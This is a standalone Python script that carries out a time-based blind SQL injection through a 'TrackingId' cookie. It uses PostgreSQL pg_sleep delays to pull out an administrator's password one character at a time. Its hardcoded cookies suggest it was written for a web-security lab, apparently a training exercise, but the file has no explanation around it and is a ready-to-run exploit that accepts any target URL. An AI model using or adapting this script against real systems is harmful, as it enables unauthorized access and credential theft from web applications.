import sys
import requests
import urllib
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_password(url):
    password_extracted = ""
    
    for i in range(1, 21):  # Check each position in the password
        found_char = False
        
        for ascii_value in range(32, 127):  # ASCII range for printable characters
            # Refined SQL payload format with a delay to detect true conditions
            sqli_payload = "' || (SELECT CASE WHEN (username='administrator' AND ascii(substr(password, %s, 1))='%s') THEN pg_sleep(10) ELSE pg_sleep(0) END)--" % (i, ascii_value)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            
            cookies = {
                'TrackingId': 'Sebt4shuw5Sa0Uyd' + sqli_payload_encoded,
                'session': 'BmUBn0VuC24iHBcHLamzyml1IPll7aO7'
            }
            
            print(f"[*] Trying position {i}, ASCII: {ascii_value} (Character: {chr(ascii_value)})")
            print(f"[*] Payload: {sqli_payload}")  # Print the payload for better visibility

            try:
                start_time = time.time()
                r = requests.get(url, cookies=cookies, verify=False, timeout=60)  # Increase timeout slightly
                end_time = time.time()
                
                elapsed_time = end_time - start_time
                print(f"[*] Elapsed time: {elapsed_time} seconds")
                
                # Detect if there was a 10-second delay indicating a match
                if elapsed_time > 9:  
                    password_extracted += chr(ascii_value)
                    sys.stdout.write(f'\rPassword so far: {password_extracted}\n')
                    sys.stdout.flush()
                    found_char = True
                    break  # Exit the loop for the current position once the character is found

            except requests.Timeout:
                print(f"\n(-) Timeout occurred at position {i}. Retrying...")

        if not found_char:
            print(f"\n(-) No character found for position {i}. Password length so far: {len(password_extracted)}")
            break  # Exit the main loop if no character was found

    print("\n(+) Password extraction complete. Final password: %s" % password_extracted)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} www.example.com")
        sys.exit(1)
        
    url = sys.argv[1]
    print("(+) Retrieving admin password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
